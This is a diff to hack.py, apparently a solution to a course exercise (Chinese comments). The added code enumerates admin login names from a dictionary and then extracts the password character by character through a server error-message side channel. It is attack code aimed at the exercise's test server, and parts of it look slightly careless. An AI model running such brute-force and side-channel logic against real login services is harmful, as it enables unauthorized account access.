@@ -1,4 +1,5 @@
 import os
+import json
 import socket
 import sys
 import itertools
@@ -54,12 +55,35 @@ def generate_passwords_with_file():
             word = line.strip()
             # 生成所有可能的大小写组合
             for password_tuple in itertools.product(*zip(word.lower(), word.upper())):
-                # eg. word='cat' 
+                # eg. word='cat'
                 # list(zip(word.lower(),word.upper())): [('c', 'C'), ('a', 'A'), ('t', 'T')]
                 # list(itertools.product(*zip(word.lower(),word.upper())))
-                # [('c', 'a', 't'), ('c', 'a', 'T'), ('c', 'A', 't'), ('c', 'A', 'T'), 
+                # [('c', 'a', 't'), ('c', 'a', 'T'), ('c', 'A', 't'), ('c', 'A', 'T'),
                 # ('C', 'a', 't'), ('C', 'a', 'T'), ('C', 'A', 't'), ('C', 'A', 'T')]
                 yield ''.join(password_tuple)
+
+
+def generate_logins():
+    """
+    (五) 暴力破解管理员登录名
+    现在您需要知道管理员的登录名和密码，幸运的是，我们有登录名字典和漏洞。
+    使用典型管理员登录名的字典。您应该尝试字典中的不同大小写变体，就像在上一阶段使用密码所做的那样。
+    至于密码，它们已经变得更加困难，因此简单的字典已经不够了。密码由小写字母、大写字母和数字组合而成。
+
+    服务器现在使用 JSON 发送消息。
+    您的程序应以 JSON 格式打印登录名和密码的组合。
+
+    示例：
+    > python hack.py localhost 9090
+    {"login": "admin", "password": "12345678"}
+    """
+    file_path = r'logins.txt'  # 假设登录名文件名为 logins.txt
+    with open(file_path, 'r') as file:
+        for line in file:
+            login = line.strip()
+            # 生成所有可能的大小写组合
+            for login_tuple in itertools.product(*zip(login.lower(), login.upper())):
+                yield ''.join(login_tuple)
 
 
 def main():
@@ -86,6 +110,61 @@ def main():
     > python hack.py 127.0.0.1 9090 qwerty
     Connection Success!
     """
+    """
+    (四) 考虑典型登录名
+    现在您需要知道管理员的登录名和密码，幸运的是，我们有登录名字典和漏洞。
+    使用典型管理员登录名的字典。您应该尝试字典中的不同大小写变体，就像在上一阶段使用密码所做的那样。
+    至于密码，它们已经变得更加困难，因此简单的字典已经不够了。密码由小写字母、大写字母和数字组合而成。
+
+    服务器现在使用 JSON 发送消息。
+    1.首先，您应该调整您的程序，使其可以将 JSON 格式的登录名和密码组合发送到服务器。您的请求现在应如下所示：
+    {
+        "login": "admin",
+        "password": "12345678"
+    }
+    2.如果登录错误，您收到的响应如下所示：
+    {
+        "result": "Wrong login!"
+    }
+    3.如果您登录正确但找不到密码，则会收到以下内容：
+    {
+        "result": "Wrong password!"
+    }
+    4.如果您的请求不是有效的 JSON 格式，或者没有 login 或 password 字段，则响应将为：
+    {
+        "result": "Bad request!"
+    }
+    5.如果发生一些异常，您将看到以下结果：
+    {
+        "result": "Exception happened during login"
+    }
+    6.当您最终成功找到登录名和密码时，您将看到以下内容：
+    {
+        "result": "Connection success!"
+    }
+
+    幸运的是，已经发现了一个漏洞：当您尝试的密码符号与正确密码的开头匹配时，会弹出上面第5条的 “异常” 消息。
+    搜索登录名时使用任何密码，因为服务器首先检查登录名是否正确。
+    因此，如果服务器使用第3条 “错误密码” 或 第5条 “异常” 而不是第2条 “错误登录” 进行响应，则表示使用的登录是正确的。
+
+    您的算法如下：
+    1.尝试使用任何密码登录。
+    2.找到登录名后，尝试所有长度为 1 的可能密码。
+    3.发生异常时，您知道您找到了密码的第一个字符。
+    4.使用 found login（找到的登录名）和 found（找到的字母）来查找密码的第二个字母。
+    5.重复此作，直到收到 'success' 消息。
+    6.最后，您的程序应以 JSON 格式打印登录名和密码的组合。
+
+    示例：
+    > python hack.py localhost 9090
+    {
+        "login" : "superuser",
+        "password" : "aDgT9tq1PU0"
+    }
+
+    > python hack.py localhost 9090
+    {"login": "new_user", "password": "Sg967s"}
+    """
     if len(sys.argv) != 3:
         print("Usage: python hack.py <IP address> <port> <message>")
         return
@@ -99,24 +178,52 @@ def main():
         sock.settimeout(3.0)
         sock.connect((ip_address, port))
 
+        # ---------------- 1. 枚举登录名 ----------------
+        correct_login = None
+        g_login = generate_logins()
+
+        for login in g_login:
+            # 发送消息
+            request = {"login": login, "password": ""}
+            sock.sendall(json.dumps(request).encode('utf-8'))
+
+            # 接收服务器的响应
+            reply = sock.recv(1024).decode('utf-8').strip()
+            result = json.loads(reply).get("result", "")
+
+            # 登录名对了
+            if result in {"Wrong password!", "Exception happened during login"}:
+                correct_login = login
+
+        if correct_login is None:
+            print("未找到有效登录名")
+            return
+
+        # ---------------- 2. 利用异常侧信道逐字符扩展密码 ----------------
+        pwd_prefix = ''
+        CHARS = string.ascii_letters + string.digits
+
         while True:
-            g = generate_passwords_with_file()
-
-            for password in g:
-                # print(password)
-                # 发送消息
-                sock.sendall(password.encode('utf-8'))
-
-                # 接收服务器的响应
+            for ch in CHARS:
+                # 发送密码
+                attempt = {"login": correct_login, "password": pwd_prefix + ch}
+                sock.sendall(json.dumps(attempt).encode('utf-8'))
                 reply = sock.recv(1024).decode('utf-8').strip()
+                result = json.loads(reply).get("result", "")
 
-                if reply == "Connection success!":
-                    print(password)
+                if result == "Connection success!":
+                    # 成功！
+                    print(json.dumps(attempt, ensure_ascii=False))
                     return
-
-                elif reply == "Too many attempts":
-                    print("服务器拒绝继续尝试，退出")
-                    return
+                if result == "Exception happened during login":
+                    # 前缀匹配正确，继续扩展
+                    pwd_prefix += ch
+                    break
+            else:
+                # 所有字符都试完仍未命中 => 异常
+                print("密码空间穷尽却未成功，可能协议/逻辑错误")
+                return
+            # 跳出 for ch 循环，进入下一位
 
 
 if __name__ == "__main__":
